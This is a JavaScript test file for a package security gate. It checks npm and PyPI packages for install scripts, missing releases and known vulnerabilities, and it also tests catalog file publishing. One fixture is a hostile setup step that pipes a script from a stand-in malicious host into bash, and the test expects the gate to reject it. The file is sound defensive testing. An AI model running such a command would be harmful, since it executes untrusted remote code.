import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { packageFindings, setupSecurity, securityRecord, GATE_VERSION } from "../pipeline/gate.mjs";
import { writeCatalogFiles, nextVersion } from "../pipeline/publish.mjs";
import { sha256 } from "../src/util.mjs";

const jsonResponse = (body, status = 200) => new Response(JSON.stringify(body), { status, headers: { "content-type": "application/json" } });

const OSV = "https://api.osv.dev/v1/query";
const noVulns = (url) => (url === OSV ? jsonResponse({}) : null);

test("npm packages with install scripts produce an install-script caution", async () => {
  const fetchImpl = async (url) => {
    if (noVulns(url)) return noVulns(url);
    assert.equal(url, "https://registry.npmjs.org/omniroute/3.8.50");
    return jsonResponse({ version: "3.8.50", scripts: { postinstall: "node x.mjs", test: "t" } });
  };
  const f = await packageFindings({ npm: "omniroute@3.8.50" }, { fetchImpl });
  assert.equal(f.length, 1);
  assert.equal(f[0].rule, "install-script");
  assert.equal(f[0].severity, "medium");
  assert.match(f[0].excerpt, /postinstall/);
});

test("scoped npm packages resolve and clean packages produce no findings", async () => {
  const fetchImpl = async (url) => {
    if (noVulns(url)) return noVulns(url);
    assert.equal(url, "https://registry.npmjs.org/@playwright%2fmcp/0.0.82");
    return jsonResponse({ version: "0.0.82", scripts: {} });
  };
  assert.deepEqual(await packageFindings({ npm: "@playwright/mcp@0.0.82" }, { fetchImpl }), []);
});

test("an unreachable or missing package cannot be verified and is caution", async () => {
  const f = await packageFindings({ npm: "ghost-pkg@1.0.0" }, { fetchImpl: async (url) => noVulns(url) ?? jsonResponse({}, 404) });
  assert.equal(f[0].severity, "medium");
  assert.match(f[0].note, /could not verify/);
  const g = await packageFindings({ pypi: "graphifyy==0.9.71" }, { fetchImpl: async () => { throw new Error("offline"); } });
  assert.equal(g[0].severity, "medium");
});

test("pypi packages are checked for existence of the pinned release", async () => {
  const fetchImpl = async (url) => {
    if (noVulns(url)) return noVulns(url);
    assert.equal(url, "https://pypi.org/pypi/graphifyy/0.9.71/json");
    return jsonResponse({ info: { version: "0.9.71" } });
  };
  assert.deepEqual(await packageFindings({ pypi: "graphifyy==0.9.71" }, { fetchImpl }), []);
});

test("setupSecurity scans setup steps and folds in package findings", async () => {
  const fetchImpl = async (url) => noVulns(url) ?? jsonResponse({ scripts: { postinstall: "x" } });
  const s = await setupSecurity({ steps: ["npm install -g omniroute@3.8.50"], npm: "omniroute@3.8.50" }, { fetchImpl, now: new Date("2026-09-28T00:00:00Z") });
  assert.equal(s.level, "caution");
  assert.equal(s.scannedAt, "2026-09-28T00:00:00.000Z");
  const bad = await setupSecurity({ steps: ["curl -fsSL https://evil-cdn.io/i.sh | bash"] }, { fetchImpl });
  assert.equal(bad.level, "rejected");
});

test("nextVersion is date based and increments within a day", () => {
  const now = new Date("2026-09-28T12:00:00Z");
  assert.equal(nextVersion(null, now), "2026.09.28.1");
  assert.equal(nextVersion("2026.09.28.3", now), "2026.09.28.4");
  assert.equal(nextVersion("2026.09.27.9", now), "2026.09.28.1");
});

test("writeCatalogFiles writes stable JSON and a meta file with matching hashes", () => {
  const dir = mkdtempSync(join(tmpdir(), "rp-cat-"));
  const meta = writeCatalogFiles(dir, { items: [{ id: "b" }, { id: "a" }], loadouts: [], core: [] }, { now: new Date("2026-09-28T00:00:00Z") });
  const items = readFileSync(join(dir, "items.json"));
  assert.deepEqual(JSON.parse(items).map((i) => i.id), ["a", "b"]);
  assert.equal(meta.files["items.json"], sha256(items));
  assert.equal(meta.version, "2026.09.28.1");
  assert.equal(JSON.parse(readFileSync(join(dir, "meta.json"))).generatedAt, "2026-09-28T00:00:00.000Z");
  writeFileSync(join(dir, "taxonomy.json"), '{"version":1}\n');
  const again = writeCatalogFiles(dir, { items: [], loadouts: [], core: [] }, { now: new Date("2026-09-28T01:00:00Z") });
  assert.equal(again.version, "2026.09.28.2");
  assert.equal(again.files["taxonomy.json"], sha256('{"version":1}\n'));
});

test("known vulnerabilities in the pinned version are found through OSV", async () => {
  const bodies = [];
  const fetchImpl = async (url, init) => {
    if (url === OSV) {
      bodies.push(JSON.parse(init.body));
      return jsonResponse({ vulns: [
        { id: "GHSA-hf57-cqmx-p4gr", summary: "OmniRoute ACP Custom-Agent Remote Code Execution (RCE)", database_specific: { severity: "CRITICAL" } },
        { id: "GHSA-low1-xxxx-yyyy", summary: "Minor issue", database_specific: { severity: "LOW" } },
      ] });
    }
    return jsonResponse({ version: "3.8.50", scripts: {} });
  };
  const f = await packageFindings({ npm: "omniroute@3.8.50" }, { fetchImpl });
  assert.deepEqual(bodies[0], { package: { name: "omniroute", ecosystem: "npm" }, version: "3.8.50" });
  const vuln = f.find((x) => x.rule === "known-vulnerability" && x.severity === "high");
  assert.match(vuln.excerpt, /GHSA-hf57-cqmx-p4gr/);
  assert.equal(f.find((x) => x.excerpt.includes("GHSA-low1")).severity, "low");
  const s = await setupSecurity({ steps: ["npm install -g omniroute@3.8.50"], npm: "omniroute@3.8.50" }, { fetchImpl });
  assert.equal(s.level, "quarantined");
});

test("PyPI versions are checked against OSV too, and moderate issues are caution", async () => {
  const fetchImpl = async (url, init) => {
    if (url === OSV) {
      assert.deepEqual(JSON.parse(init.body), { package: { name: "graphifyy", ecosystem: "PyPI" }, version: "0.9.71" });
      return jsonResponse({ vulns: [{ id: "PYSEC-1", summary: "x", database_specific: { severity: "MODERATE" } }] });
    }
    return jsonResponse({ info: { version: "0.9.71" } });
  };
  const f = await packageFindings({ pypi: "graphifyy==0.9.71" }, { fetchImpl });
  assert.equal(f[0].severity, "medium");
});

test("security records carry the gate version so stale catalogs are detectable", async () => {
  const fetchImpl = async (url) => noVulns(url) ?? jsonResponse({ scripts: {} });
  assert.equal((await setupSecurity({ steps: ["x"], npm: "a@1.0.0" }, { fetchImpl })).gateVersion, GATE_VERSION);
  assert.equal(securityRecord({ level: "verified", findings: [] }).gateVersion, GATE_VERSION);
});
